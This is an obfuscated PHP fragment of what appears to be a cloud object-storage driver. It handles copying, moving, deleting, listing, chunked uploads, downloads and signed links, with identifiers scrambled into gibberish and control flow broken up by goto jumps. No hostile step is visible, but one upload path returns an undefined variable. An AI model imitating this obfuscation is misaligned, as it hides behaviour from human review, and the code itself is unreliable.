$a°˜šÉÂ°…[8]); if ($this->_isFolder($CíÆë›Šà•)) { return $this->getPathOuter($CíÆë›Šà•); } $F×™øâÀÃ• = array($a°˜šÉÂ°…[1334]); $FÀìÌ÷£¬ì = $this->ussRequest($CíÆë›Šà•, $a°˜šÉÂ°…[223], !1, $F×™øâÀÃ•); return $FÀìÌ÷£¬ì[$a°˜šÉÂ°…[1085]] ? $this->getPathOuter($CíÆë›Šà•) : !1; } public function copyFile($F£µ÷ÃÚå, $fµî‘¶îØÕ) { $CŒÓ¥ğÅŒŞ =& $_SERVER[¬ı§†‰ú˜¼]; $c™¢Ùİ™ = array($CŒÓ¥ğÅŒŞ[1335] . "\x2f{$this->bucket}\x2f{$F£µ÷ÃÚå}", $CŒÓ¥ğÅŒŞ[1336]); $F»¯©ŒÆ¬« = $this->ussRequest($fµî‘¶îØÕ, $CŒÓ¥ğÅŒŞ[225], !1, $c™¢Ùİ™); return $F»¯©ŒÆ¬«[$CŒÓ¥ğÅŒŞ[1085]] ? !0 : $this->getPathOuter($fµî‘¶îØÕ); } public function moveFile($cˆ˜‚¶ òí, $F®À…Îá Æ) { $fÁ‚¨ƒááù =& $_SERVER[¬ı§†‰ú˜¼]; $Aß£ô‘†ö† = array($fÁ‚¨ƒááù[1337] . "\57{$this->bucket}\x2f{$cˆ˜‚¶ òí}", $fÁ‚¨ƒááù[1336]); $DÊã‡‡à©ò = $this->ussRequest($F®À…Îá Æ, $fÁ‚¨ƒááù[225], !1, $Aß£ô‘†ö†); return $DÊã‡‡à©ò[$fÁ‚¨ƒááù[1085]] ? !0 : $this->getPathOuter($F®À…Îá Æ); } public function delFile($aÛ‘íäƒ°¢) { $c¦Éèë‹ö‡ =& $_SERVER[¬ı§†‰ú˜¼]; $Cà–½ô‡¯ = $this->ussRequest($aÛ‘íäƒ°¢, $c¦Éèë‹ö‡[1338]); return $Cà–½ô‡¯[$c¦Éèë‹ö‡[1085]] ? !0 : !1; } public function delFolder($AìÛ²áÚî) { goto b¢½¾õ„á¼; CÕ˜‘ÓÕµ­: $eã×™›øçğ = $a¯ãŸ®çç = array(); $this->fileList($AìÛ²áÚî, $eã×™›øçğ, $a¯ãŸ®çç, !0); $this->listItemCache = !0; goto D–šÁÒâŠ; Då™Íí¦Ğ: return $A¿¦Ë¼Â[$A‡ÀğÂ›‰—[1085]]; goto eÌñäá‡½»; D–šÁÒâŠ: foreach ($a¯ãŸ®çç as $e¢ßÊ¿”ò®) { $A¿¦Ë¼Â = $this->ussRequest($e¢ßÊ¿”ò®[$A‡ÀğÂ›‰—[28]], $A‡ÀğÂ›‰—[1338]); if (!$A¿¦Ë¼Â[$A‡ÀğÂ›‰—[1085]]) { return !1; } } foreach ($eã×™›øçğ as $c¸£Ş­Ñí) { $A¿¦Ë¼Â = $this->ussRequest($c¸£Ş­Ñí, $A‡ÀğÂ›‰—[1338]); if (!$A¿¦Ë¼Â[$A‡ÀğÂ›‰—[1085]]) { return !1; } } $A¿¦Ë¼Â = $this->ussRequest($AìÛ²áÚî, $A‡ÀğÂ›‰—[1338]); goto Då™Íí¦Ğ; b¢½¾õ„á¼: $A‡ÀğÂ›‰— =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->exist($AìÛ²áÚî)) { return !0; } $this->listItemCache = !1; goto CÕ˜‘ÓÕµ­; eÌñäá‡½»: } public function rename($f±Û¯„Šä, $a³•Øæ“‘) { if ($this->isFile($f±Û¯„Šä)) { $a³•Øæ“‘ = get_path_father($f±Û¯„Šä) . $a³•Øæ“‘; return $this->moveFile($f±Û¯„Šä, $a³•Øæ“‘); } return $this->renameObject($f±Û¯„Šä, $a³•Øæ“‘); } public function fileInfo($D…©Ô‘È¢, $a¡«‚ï‚íã = false, $C”ïêˆ£± = array()) { goto bª®ó‡¥À™; d¢À°›öÉœ: $BÅ‰ƒŞÎµ¸[$aÄäõãï[193]] = intval($C”ïêˆ£±[$aÄäõãï[1339]]); $BÅ‰ƒŞÎµ¸[$aÄäõãï[84]] = intval($C”ïêˆ£±[$aÄäõãï[1340]]); $BÅ‰ƒŞÎµ¸[$aÄäõãï[78]] = $C”ïêˆ£±[$aÄäõãï[78]]; goto a¸ÍºèÂ‰Ê; FÉŒÈë­Ñ‰: $BÅ‰ƒŞÎµ¸[$aÄäõãï[193]] = $BÅ‰ƒŞÎµ¸[$aÄäõãï[84]] = 0; $BÅ‰ƒŞÎµ¸[$aÄäõãï[194]] = $BÅ‰ƒŞÎµ¸[$aÄäõãï[195]] = !0; if (empty($C”ïêˆ£±)) { $C”ïêˆ£± = $this->objectMeta($D…©Ô‘È¢); if (!$C”ïêˆ£±) { return $BÅ‰ƒŞÎµ¸; } } goto d¢À°›öÉœ; a¸ÍºèÂ‰Ê: return $BÅ‰ƒŞÎµ¸; goto a¬öäåòñë; bª®ó‡¥À™: $aÄäõãï =& $_SERVER[¬ı§†‰ú˜¼]; $BÅ‰ƒŞÎµ¸ = array($aÄäõãï[28] => $this->pathThis($D…©Ô‘È¢), $aÄäõãï[76] => $this->getPathOuter($aÄäõãï[8] . $D…©Ô‘È¢), $aÄäõãï[29] => $aÄäõãï[192], $aÄäõãï[78] => isset($C”ïêˆ£±[$aÄäõãï[78]]) ? $C”ïêˆ£±[$aÄäõãï[78]] : 0, $aÄäõãï[168] => $this->ext($D…©Ô‘È¢)); if ($a¡«‚ï‚íã) { return $BÅ‰ƒŞÎµ¸; } goto FÉŒÈë­Ñ‰; a¬öäåòñë: } public function folderInfo($C¸Ğ×íñ×, $a‹‚†¥ÓÉÃ = false) { goto F’ğ®•Öùš; A¦•”™·Ÿí: $EÛ‚‘æ©Â[$AÖÙÌ“ã[193]] = $EÛ‚‘æ©Â[$AÖÙÌ“ã[84]] = 0; $EÛ‚‘æ©Â[$AÖÙÌ“ã[194]] = $EÛ‚‘æ©Â[$AÖÙÌ“ã[195]] = !0; if (empty($fŒÊòš¸Úë)) { $fŒÊòš¸Úë = $this->objectMeta($C¸Ğ×íñ×); if (!$fŒÊòš¸Úë) { return $EÛ‚‘æ©Â; } } goto a…õ–ß“è©; F’ğ®•Öùš: $AÖÙÌ“ã =& $_SERVER[¬ı§†‰ú˜¼]; $EÛ‚‘æ©Â = array($AÖÙÌ“ã[28] => $this->pathThis($C¸Ğ×íñ×), $AÖÙÌ“ã[76] => $this->getPathOuter($AÖÙÌ“ã[8] . $C¸Ğ×íñ×), $AÖÙÌ“ã[29] => $AÖÙÌ“ã[77]); if ($a‹‚†¥ÓÉÃ) { return $EÛ‚‘æ©Â; } goto A¦•”™·Ÿí; a…õ–ß“è©: $EÛ‚‘æ©Â[$AÖÙÌ“ã[193]] = intval($fŒÊòš¸Úë[$AÖÙÌ“ã[1339]]); $EÛ‚‘æ©Â[$AÖÙÌ“ã[84]] = intval($fŒÊòš¸Úë[$AÖÙÌ“ã[1340]]); return $EÛ‚‘æ©Â; goto B½…‡¼ìˆ; B½…‡¼ìˆ: } private function listObjs($Cà¢„É‚ïß, $B‘æñŸõ•® = 0, $c¦Î„†Œ = 1000) { $e•–„¹¨â  =& $_SERVER[¬ı§†‰ú˜¼]; $D¦‡Ÿ»Í†¶ = array($e•–„¹¨â [1341], $e•–„¹¨â [1342] . $c¦Î„†Œ); if ($B‘æñŸõ•®) { $D¦‡Ÿ»Í†¶[] = $e•–„¹¨â [1343] . $B‘æñŸõ•®; } $E­Ÿñö¿‘½ = $this->ussRequest($Cà¢„É‚ïß, $e•–„¹¨â [227], !1, $D¦‡Ÿ»Í†¶); return !$E­Ÿñö¿‘½[$e•–„¹¨â [1085]] ? !1 : $E­Ÿñö¿‘½[$e•–„¹¨â [1087]]; } private function fileList($EÀŸØğÜ‡ğ, &$e é‹²¦ÂÓ, &$fƒïéÂÁ¹Ğ, $A›İææ“ë = false) { goto E‰«¥ğË¯¦; C½¤ÂˆòİÅ: $c„ñø‰¯Éƒ = rtrim($EÀŸØğÜ‡ğ, $BóÏ›§“ÚÊ[8]) . $BóÏ›§“ÚÊ[8]; $A„Ïš‰Ÿ† = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $cØ‹È¼»ÃÕ = $this->listObjs($EÀŸØğÜ‡ğ, $F†ß…†÷Ö, $Fªè””ÑÙÀ); if (!$cØ‹È¼»ÃÕ) { return !1; } $F†ß…†÷Ö = isset($cØ‹È¼»ÃÕ[$BóÏ›§“ÚÊ[1344]]) ? $cØ‹È¼»ÃÕ[$BóÏ›§“ÚÊ[1344]] : $BóÏ›§“ÚÊ[33]; $CÇŞ—¤ÃÁå = isset($cØ‹È¼»ÃÕ[$BóÏ›§“ÚÊ[1345]]) ? $cØ‹È¼»ÃÕ[$BóÏ›§“ÚÊ[1345]] : array(); foreach ($CÇŞ—¤ÃÁå as $E»Ú²‰Ò’’) { $E²‹š‹øÙ = $E»Ú²‰Ò’’[$BóÏ›§“ÚÊ[29]] == $BóÏ›§“ÚÊ[77] ? !0 : !1; $AÉ×Ş‰¬ÙØ = ltrim($c„ñø‰¯Éƒ . $E»Ú²‰Ò’’[$BóÏ›§“ÚÊ[28]], $BóÏ›§“ÚÊ[8]) . ($E²‹š‹øÙ ? $BóÏ›§“ÚÊ[8] : $BóÏ›§“ÚÊ[33]); $aêµœë‘° = array($BóÏ›§“ÚÊ[28] => $AÉ×Ş‰¬ÙØ, $BóÏ›§“ÚÊ[29] => $E²‹š‹øÙ ? $BóÏ›§“ÚÊ[77] : $BóÏ›§“ÚÊ[192], $BóÏ›§“ÚÊ[78] => $E»Ú²‰Ò’’[$BóÏ›§“ÚÊ[334]], $BóÏ›§“ÚÊ[1340] => $E»Ú²‰Ò’’[$BóÏ›§“ÚÊ[1346]]); if ($A„Ïš‰Ÿ†) { $this->cacheMethod($BóÏ›§“ÚÊ[198], $AÉ×Ş‰¬ÙØ, $E²‹š‹øÙ); $this->cacheMethod($BóÏ›§“ÚÊ[199], $AÉ×Ş‰¬ÙØ, $aêµœë‘°); } if ($E²‹š‹øÙ) { $e é‹²¦ÂÓ[] = $AÉ×Ş‰¬ÙØ; if ($A›İææ“ë) { $this->fileList($AÉ×Ş‰¬ÙØ, $e é‹²¦ÂÓ, $fƒïéÂÁ¹Ğ, $A›İææ“ë); } continue; } $fƒïéÂÁ¹Ğ[] = $aêµœë‘°; } if (count($CÇŞ—¤ÃÁå) < $Fªè””ÑÙÀ) { break; } } goto fœ–¨Œ¥ôŠ; E‰«¥ğË¯¦: $BóÏ›§“ÚÊ =& $_SERVER[¬ı§†‰ú˜¼]; $F†ß…†÷Ö = $BóÏ›§“ÚÊ[33]; $Fªè””ÑÙÀ = 1000; goto C½¤ÂˆòİÅ; fœ–¨Œ¥ôŠ: if ($A„Ïš‰Ÿ†) { $this->cacheMethod($BóÏ›§“ÚÊ[198], $EÀŸØğÜ‡ğ, !0); } goto cè¼ë™™¡õ; cè¼ë™™¡õ: } public function listPath($B«Ô”ğ‡èÎ, $F‘åëß = false) { $EÙ ‘ŒÏ =& $_SERVER[¬ı§†‰ú˜¼]; $FŒ¨“Æòº = $FéÀñëæ» = array(); $this->fileList($B«Ô”ğ‡èÎ, $FŒ¨“Æòº, $FéÀñëæ»); foreach ($FŒ¨“Æòº as $dµ­Öå¿” => $D¾Ğ°Âäƒ) { $FŒ¨“Æòº[$dµ­Öå¿”] = $this->folderInfo($D¾Ğ°Âäƒ, $F‘åëß); } foreach ($FéÀñëæ» as $dµ­Öå¿” => $D¾Ğ°Âäƒ) { $FéÀñëæ»[$dµ­Öå¿”] = $this->fileInfo($D¾Ğ°Âäƒ[$EÙ ‘ŒÏ[28]], $F‘åëß, $D¾Ğ°Âäƒ); } return array($EÙ ‘ŒÏ[75] => $FŒ¨“Æòº, $EÙ ‘ŒÏ[74] => $FéÀñëæ»); } public function has($D©›Ã™¿Ñ‘, $d¬ÉÌ¼»Òˆ = false, $DÖÖ‡Ûù’Î = true) { goto EƒÕëĞ±î–; B«Õ°áîÕ•: $a²ãÖˆ‘¡ = 0; $f¹”É•Ÿëö = 0; $D‡… Ú‘Ì  = rtrim($D©›Ã™¿Ñ‘, $Dè¡äéÇ½µ[8]) . $Dè¡äéÇ½µ[8]; goto bšÜŞÃ¯; EƒÕëĞ±î–: $Dè¡äéÇ½µ =& $_SERVER[¬ı§†‰ú˜¼]; $e Ûœ†ãƒ = $Dè¡äéÇ½µ[33]; $déë®ŠØ‰ = 500; goto B«Õ°áîÕ•; bšÜŞÃ¯: while (!0) { check_abort(); $BĞ‚‡ç–¦Ü = $this->listObjs($D©›Ã™¿Ñ‘, $e Ûœ†ãƒ, $déë®ŠØ‰); if (!$BĞ‚‡ç–¦Ü) { return !1; } $e Ûœ†ãƒ = isset($BĞ‚‡ç–¦Ü[$Dè¡äéÇ½µ[1344]]) ? $BĞ‚‡ç–¦Ü[$Dè¡äéÇ½µ[1344]] : $Dè¡äéÇ½µ[33]; $Fáàˆ„ = isset($BĞ‚‡ç–¦Ü[$Dè¡äéÇ½µ[1345]]) ? $BĞ‚‡ç–¦Ü[$Dè¡äéÇ½µ[1345]] : array(); if (empty($Fáàˆ„)) { break; } $A’åÔ²ó¥Ù = array_filter($Fáàˆ„, function ($A÷·Ó…ÓØø) { $eÎ»Ã£ğŞœ =& $_SERVER[¬ı§†‰ú˜¼]; return $A÷·Ó…ÓØø[$eÎ»Ã£ğŞœ[29]] == $eÎ»Ã£ğŞœ[77]; }); $F‰ÏÌ®Ö—› = count($Fáàˆ„); $A’åÔ²ó¥Ù = count($A’åÔ²ó¥Ù); $DÄ´’®İÜƒ = $F‰ÏÌ®Ö—› - $A’åÔ²ó¥Ù; if ($d¬ÉÌ¼»Òˆ) { $f¹”É•Ÿëö += $A’åÔ²ó¥Ù; $a²ãÖˆ‘¡ += $DÄ´’®İÜƒ; if ($F‰ÏÌ®Ö—› < $déë®ŠØ‰) { break; } continue; } if ($DÖÖ‡Ûù’Î) { if ($DÄ´’®İÜƒ) { return !0; } } else { if ($A’åÔ²ó¥Ù) { return !0; } } if ($F‰ÏÌ®Ö—› < $déë®ŠØ‰) { break; } } if ($d¬ÉÌ¼»Òˆ) { return array($Dè¡äéÇ½µ[202] => $a²ãÖˆ‘¡, $Dè¡äéÇ½µ[203] => $f¹”É•Ÿëö); } return !1; goto F‘Ğ‹Õ¾êÔ; F‘Ğ‹Õ¾êÔ: } public function listAll($c™Œ‘‚šŞ) { goto eÚ­«ôÃÊ; eƒÃ›¶‘ ª: $f¹‰¢½¨âö = array(); foreach ($Eø™ˆß ô as $Fã–‰âÍ¥) { $f¹‰¢½¨âö[$Fã–‰âÍ¥[$B“¼Ÿóº×½[28]]] = $Fã–‰âÍ¥[$B“¼Ÿóº×½[78]]; } foreach ($cÆ–•µ… as $Fã–‰âÍ¥) { if (is_string($Fã–‰âÍ¥)) { $f¹‰¢½¨âö[$Fã–‰âÍ¥] = 0; } } goto D½¤íïí„; D½¤íïí„: return $this->listAllFiles($c™Œ‘‚šŞ, array_keys($f¹‰¢½¨âö), $f¹‰¢½¨âö); goto AéÍ·‡Í¹Û; eÚ­«ôÃÊ: $B“¼Ÿóº×½ =& $_SERVER[¬ı§†‰ú˜¼]; $cÆ–•µ… = $Eø™ˆß ô = array(); $this->fileList($c™Œ‘‚šŞ, $cÆ–•µ…, $Eø™ˆß ô, !0); goto eƒÃ›¶‘ ª; AéÍ·‡Í¹Û: } public function canRead($a‚Øƒª‹¥™) { return $this->exist($a‚Øƒª‹¥™) ? !0 : !1; } public function canWrite($C¡·’£é¥) { return $this->exist($C¡·’£é¥) ? !0 : !1; } public function getContent($eÜ‡Åò½Õî) { return $this->fileSubstr($eÜ‡Åò½Õî, 0, -1); } public function setContent($aÇÂ•İŠäÈ, $Fõƒ…‹±¾› = '') { $eŠ§°š±”Í =& $_SERVER[¬ı§†‰ú˜¼]; if (!$Fõƒ…‹±¾›) { $aƒ„˜«„¸õ = $this->ussRequest($aÇÂ•İŠäÈ, $eŠ§°š±”Í[223]); return $aƒ„˜«„¸õ[$eŠ§°š±”Í[1085]]; } $FÜ¸¡Î·Œì = $this->tempFile($this->pathThis($aÇÂ•İŠäÈ)); file_put_contents($FÜ¸¡Î·Œì, $Fõƒ…‹±¾›); if ($this->upload($aÇÂ•İŠäÈ, $FÜ¸¡Î·Œì)) { $this->tempFileRemve($FÜ¸¡Î·Œì); return !0; } return !1; } public function fileSubstr($d…ÅÍ®ªù, $A½¼¶åïõ, $f¿ôÌ›ğáŒ) { $e¨ ÊÕÁØ =& $_SERVER[¬ı§†‰ú˜¼]; if (!($e±ÑƒÇàÇÛ = $this->link($d…ÅÍ®ªù))) { return !1; } $f¢ŒáÂ…Ö™ = !1; if ($f¿ôÌ›ğáŒ > 0) { $BºÑÍƒÌãÆ = $A½¼¶åïõ + $f¿ôÌ›ğáŒ - 1; $f¢ŒáÂ…Ö™ = array($e¨ ÊÕÁØ[1307] . $A½¼¶åïõ . $e¨ ÊÕÁØ[438] . $BºÑÍƒÌãÆ); } $D±êœ‰íå = url_request($e±ÑƒÇàÇÛ, $e¨ ÊÕÁØ[227], !1, $f¢ŒáÂ…Ö™); return $D±êœ‰íå[$e¨ ÊÕÁØ[714]] ? $D±êœ‰íå[$e¨ ÊÕÁØ[1087]] : !1; } public function upload($FˆÁâ—È‡å, $BÈ¹¢Ñ¬Ò, $eÎ‰ÃÃÏï = false, $e¼÷‘•”°– = REPEAT_REPLACE) { goto c–è”‘ïˆ„; fŞ‰ÃõŸæ: if (!$DìÅÍƒ¿Ô·[$CÈôÆùÀİ[1085]]) { return !1; } $A¸ÉµÁàÓ‡ = $DìÅÍƒ¿Ô·[$CÈôÆùÀİ[1087]]; $f‰«ìÚ½Ñ¹ = 0; goto AĞ‰‹ƒä‰; f†¸‚õğáÒ: do { $D¹ÂæŒ…½ = $A¸ÉµÁàÓ‡[$CÈôÆùÀİ[1353]]; fseek_64($DÆ÷É¼¦õŠ, $f‰«ìÚ½Ñ¹); $C­­óÈĞ¬ = fread($DÆ÷É¼¦õŠ, $D¹ÂæŒ…½); $e¢ğ¡ˆ­‡ = 0; do { $e¢ğ¡ˆ­‡++; $A¸ÉµÁàÓ‡ = $this->uploadPart($FˆÁâ—È‡å, $A¸ÉµÁàÓ‡, $C­­óÈĞ¬); } while (!$A¸ÉµÁàÓ‡ && $e¢ğ¡ˆ­‡ < 3); if (!$A¸ÉµÁàÓ‡) { return !1; } $Cî‰‘†œŞó = $A¸ÉµÁàÓ‡[$CÈôÆùÀİ[1352]]; $f‰«ìÚ½Ñ¹ += $D¹ÂæŒ…½; } while ($Cî‰‘†œŞó != -1); fclose($DÆ÷É¼¦õŠ); $eß÷Ä³Ù¬÷ = array($CÈôÆùÀİ[1354], $CÈôÆùÀİ[1355] . $A¸ÉµÁàÓ‡[$CÈôÆùÀİ[1356]], $CÈôÆùÀİ[1350]); goto E°ÍÈ–Ê«; c–è”‘ïˆ„: $CÈôÆùÀİ =& $_SERVER[¬ı§†‰ú˜¼]; $d®ÄŞ •ÑÛ = IO::size($BÈ¹¢Ñ¬Ò); if ($d®ÄŞ •ÑÛ <= 1024 * 1024 * 200) { $BƒˆàëŞİ = array($CÈôÆùÀİ[1347] . $BÈ¹¢Ñ¬Ò); $DìÅÍƒ¿Ô· = $this->ussRequest($FˆÁâ—È‡å, $CÈôÆùÀİ[225], $BƒˆàëŞİ); return $DìÅÍƒ¿Ô·[$CÈôÆùÀİ[1085]] ? $this->getPathOuter($FˆÁâ—È‡å) : !1; } goto cá¶óí…¼º; E°ÍÈ–Ê«: $DìÅÍƒ¿Ô· = $this->ussRequest($FˆÁâ—È‡å, $CÈôÆùÀİ[225], !1, $eß÷Ä³Ù¬÷); return $DìÅÍƒ¿Ô·[$CÈôÆùÀİ[1085]] ? $this->getPathOuter($fµõğ¶ãã) : !1; goto C‰÷Â¾Ñœê; cá¶óí…¼º: $FÎòœº²è‰ = 1024 * 1024 * 10; $eß÷Ä³Ù¬÷ = array($CÈôÆùÀİ[1348], $CÈôÆùÀİ[1349] . $d®ÄŞ •ÑÛ, $CÈôÆùÀİ[1350], $CÈôÆùÀİ[1351] . $FÎòœº²è‰); $DìÅÍƒ¿Ô· = $this->ussRequest($FˆÁâ—È‡å, $CÈôÆùÀİ[225], !1, $eß÷Ä³Ù¬÷); goto fŞ‰ÃõŸæ; AĞ‰‹ƒä‰: $Cî‰‘†œŞó = $A¸ÉµÁàÓ‡[$CÈôÆùÀİ[1352]]; $DÆ÷É¼¦õŠ = fopen($BÈ¹¢Ñ¬Ò, $CÈôÆùÀİ[1257]); if (!$DÆ÷É¼¦õŠ) { return !1; } goto f†¸‚õğáÒ; C‰÷Â¾Ñœê: } private function uploadPart($B‚ôÈÁ•ƒ, $CÂË×ªÛ…´, &$CÜ¬›“ìİ) { $D¯¿÷ËØĞì =& $_SERVER[¬ı§†‰ú˜¼]; $eí¾†¨ÃË = array($D¯¿÷ËØĞì[1357], $D¯¿÷ËØĞì[1355] . $CÂË×ªÛ…´[$D¯¿÷ËØĞì[1356]], $D¯¿÷ËØĞì[1358] . $CÂË×ªÛ…´[$D¯¿÷ËØĞì[1352]], $D¯¿÷ËØĞì[141] . $CÂË×ªÛ…´[$D¯¿÷ËØĞì[1353]]); $A„ÌÙ’ùó = $this->ussRequest($B‚ôÈÁ•ƒ, $D¯¿÷ËØĞì[225], $CÜ¬›“ìİ, $eí¾†¨ÃË); return !$A„ÌÙ’ùó[$D¯¿÷ËØĞì[1085]] ? $A„ÌÙ’ùó[$D¯¿÷ËØĞì[1085]] : $A„ÌÙ’ùó[$D¯¿÷ËØĞì[1087]]; } public function uploadFormData($E£Şº™ìƒ¨, $c±»ÇøÌ½â = 3600) { return $this->uploadPolicy($E£Şº™ìƒ¨, $c±»ÇøÌ½â); } public function multiUploadFormData($B¬ƒ©»Ö¦Å, $DÃĞ„œé¾‘ = 3600) { $DêÂÕñô Ú =& $_SERVER[¬ı§†‰ú˜¼]; $fò¿ŞÊªóñ = (int) $GLOBALS[$DêÂÕñô Ú[7]][$DêÂÕñô Ú[78]]; return $this->uploadPolicy($B¬ƒ©»Ö¦Å, $DÃĞ„œé¾‘, $fò¿ŞÊªóñ); } private function uploadPolicy($a‹ˆ»é°, $bÓ¶óÊŞñ = 3600, $F¨Œ”…™é = 0) { goto Cê×Ë®¾Â; Cì¾ŸÑ†Œê: $CÆÒ¡Á½Å = array($BãõÄËÍ‚É[1359] => $this->bucket, $BãõÄËÍ‚É[1360] => $a‹ˆ»é°, $BãõÄËÍ‚É[1361] => time() + $bÓ¶óÊŞñ, $BãõÄËÍ‚É[1362] => $dµ§„¬Š); if ($F¨Œ”…™é) { $CÆÒ¡Á½Å[$BãõÄËÍ‚É[1273]] = $F¨Œ”…™é; } $E–Ÿ“Ë¸¾© = base64_encode(json_encode($CÆÒ¡Á½Å)); goto a©İ š—Ë²; a©İ š—Ë²: $bê’Á‘ğ¿ã = base64_encode(hash_hmac($BãõÄËÍ‚É[1329], "\120\x4f\123\x54\46{$dŠ–ö¥Şİ}\46{$dµ§„¬Š}\x26{$E–Ÿ“Ë¸¾©}", md5("{$this->userpass}"), !0)); $f¯Œ¼Á¢ó· = array($BãõÄËÍ‚É[1199] => $E–Ÿ“Ë¸¾©, $BãõÄËÍ‚É[1363] => "\125\120\x59\125\116\x20{$this->username}\72{$bê’Á‘ğ¿ã}", $BãõÄËÍ‚É[175] => $this->endpoint . $dŠ–ö¥Şİ); return $f¯Œ¼Á¢ó·; goto d¥ØŒÊ† ˆ; Cê×Ë®¾Â: $BãõÄËÍ‚É =& $_SERVER[¬ı§†‰ú˜¼]; $dŠ–ö¥Şİ = $BãõÄËÍ‚É[8] . $this->bucket; $dµ§„¬Š = gmdate($BãõÄËÍ‚É[1294]); goto Cì¾ŸÑ†Œê; d¥ØŒÊ† ˆ: } public function download($c¤…ÂÈÜî‡, $c…ÄÒëñš) { goto DÈ¾ä¢Òñ÷; e®‚§ß°ù: $D¶®Âå°é = 1024 * 200; $Eã˜ôò—Îî = fopen($e¤ˆßÄ¦îã, $_SERVER[¬ı§†‰ú˜¼][1313]); while (!0) { $dëŒ—Ä¹™ = $this->fileSubstr($c¤…ÂÈÜî‡, $fÔº£ğÁ‘í, $D¶®Âå°é); if ($dëŒ—Ä¹™ === !1) { return !1; } fwrite($Eã˜ôò—Îî, $dëŒ—Ä¹™); $fÔº£ğÁ‘í += $D¶®Âå°é; if (strlen($dëŒ—Ä¹™) < $D¶®Âå°é) { break; } } goto F­ÆøØ®“º; F­ÆøØ®“º: fclose($Eã˜ôò—Îî); return $c…ÄÒëñš; goto Aãñ™†è¾Ù; DÈ¾ä¢Òñ÷: $e¤ˆßÄ¦îã = IO::getPathInner(IO::mkfile($c…ÄÒëñš)); if (!($e¸‡™Îæèê = $this->link($c¤…ÂÈÜî‡))) { return !1; } $fÔº£ğÁ‘í = 0; goto e®‚§ß°ù; Aãñ™†è¾Ù: } public function link($Aãä®­Ö‹¯, $aò¶¾×ëÂœ = array()) { $fº…±ÓĞîˆ =& $_SERVER[¬ı§†‰ú˜¼]; $Aãä®­Ö‹¯ = trim($Aãä®­Ö‹¯, $fº…±ÓĞîˆ[8]); if (!empty($this->token)) { $EÏÄ÷íš÷ = strtotime(date($fº…±ÓĞîˆ[1364])); $aá‹³Ò•© = substr(md5($this->token . $fº…±ÓĞîˆ[281] . $EÏÄ÷íš÷ . $fº…±ÓĞîˆ[1365] . $Aãä®­Ö‹¯), 12, 8) . $EÏÄ÷íš÷; $aò¶¾×ëÂœ[] = $fº…±ÓĞîˆ[1366] . $aá‹³Ò•©; } $CÆ¡áÕæĞ° = !empty($aò¶¾×ëÂœ) ? $fº…±ÓĞîˆ[70] . implode($fº…±ÓĞîˆ[281], $aò¶¾×ëÂœ) : $fº…±ÓĞîˆ[33]; return $this->getHost() . $fº…±ÓĞîˆ[8] . $Aãä®­Ö‹¯ . $CÆ¡áÕæĞ°; } public function fileOut($bó·‘Õ¶Ïˆ, $A°Ø™¶ôç¶ = false, $Då©¸Ò˜Ü = false, $FáÖ‚ßĞ‹“ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($bó·‘Õ¶Ïˆ, $A°Ø™¶ôç¶, $Då©¸Ò˜Ü, $FáÖ‚ßĞ‹“); } if (!$Då©¸Ò˜Ü) { $Då©¸Ò˜Ü = $this->pathThis($bó·‘Õ¶Ïˆ); } $f¸¨—¾Ó‘“ = $A°Ø™¶ôç¶ ? array($_SERVER[¬ı§†‰ú˜¼][1367] . rawurlencode($Då©¸Ò˜Ü)) : array(); $FÏ²ÇøÄ°‡ = $this->link($bó·‘Õ¶Ïˆ, $f¸¨—¾Ó‘“); $this->fileOutLink($FÏ²ÇøÄ°‡); } public function fileOutServer($bŸ‡–îÜ•, $bÄÌ´¥©Ÿ = false, $dä¹ŞêËÙÍ = false, $eöèé¡¦¯ = '') { parent::fileOut($bŸ‡–îÜ•, $bÄÌ´¥©Ÿ, $dä¹ŞêËÙÍ, $eöèé¡¦¯); } public function fileOutImage($díÒ¥©È­, $cà¨»”±Ù· = 250) { $DÜ£ã¨©·Ó = $this->link($díÒ¥©È­ . $_SERVER[¬ı§†‰ú˜¼][1368] . $cà¨»”±Ù·); $this->fileOutLink($DÜ£ã¨©·Ó); } public function fileOutImageServer($eîâ‚ãÚ‡, $aŠ˜ôÅòÑß = 250) { parent::fileOutImage($eîâ‚ãÚ‡, $aŠ˜ôÅòÑß); } public function hashMd5($f„‚«¾Œâ) { $Dó¯Ã¨„õ• =& $_SERVER[¬ı§†‰ú˜¼]; $F½©ô’¸£Ï = $this->_objectMeta($f„‚«¾Œâ); return isset($F½©ô’¸£Ï[$Dó¯Ã¨„õ•[207]]) ? $F½©ô’¸£Ï[$Dó¯Ã¨„õ•[207]] : !1; } public function size($aâÊÆŒ‡©•) { $A¤ª¬¦Ñ¯¿ = $this->objectMeta($aâÊÆŒ‡©•); return $A¤ª¬¦Ñ¯¿ ? $A¤ª¬¦Ñ¯¿[$_SERVER[¬ı§†‰ú˜¼][78]] : 0; } public function info($Aø—Ä¥˜Öõ) { if ($this->isFolder($Aø—Ä¥˜Öõ)) { return $this->folderInfo($Aø—Ä¥˜Öõ); } else { if ($this->isFile($Aø—Ä¥˜Öõ)) { return $this->fileInfo($Aø—Ä¥˜Öõ); } } return !1; } public function exist($Eİ¦æšçª…) { return $this->isFile($Eİ¦æšçª…) || $this->isFolder($Eİ¦æšçª…); } public function isFile($F¯å…ñßÌ×) { return !$this->isFolder($F¯å…ñßÌ×) && $this->objectMeta($F¯å…ñßÌ×); } public function isFolder($fùŒ˜Í»Øá) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][198], $fùŒ˜Í»Øá); } protected function objectMeta($bø‘èà‚çğ) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][199], $bø‘èà‚çğ); } protected function _objectMeta($b³×Â®Û“) { goto BÆöÜªô”º; C¤Ôå‡ÍµÖ: $A‚ÓÖğ¸Å = array($CÊÊ®ÉÚéƒ[29] => isset($a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1370]]) ? $a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1370]] : null, $CÊÊ®ÉÚéƒ[78] => isset($a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1371]]) ? $a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1371]] : null, $CÊÊ®ÉÚéƒ[207] => isset($a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1372]]) ? $a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1372]] : null, $CÊÊ®ÉÚéƒ[1339] => isset($a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1373]]) ? $a‘­í´Âñ[$CÊÊ®ÉÚéƒ[1373]] : null); 